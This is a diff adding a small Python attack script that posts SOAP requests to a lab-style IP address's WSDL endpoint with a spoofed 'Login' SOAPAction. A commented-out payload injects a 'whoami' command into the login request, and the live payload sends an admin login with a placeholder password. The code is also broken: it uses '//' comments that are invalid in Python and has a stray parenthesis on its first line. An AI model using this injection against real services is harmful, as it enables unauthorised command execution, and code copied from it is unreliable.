@@ -1,0 +1,9 @@
+// client_spoof2.py)
+
+import requests
+
+// payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" // xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'
+
+payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://tempuri.org/">  <soap:Body>    <tns:LoginRequest>      <username>admin</username>    <password>your_password</password>      </tns:LoginRequest>  </soap:Body></soap:Envelope>'
+
+print(requests.post("http://10.129.110.171:3002/wsdl", data=payload, headers={"SOAPAction":'"Login"'}).content)
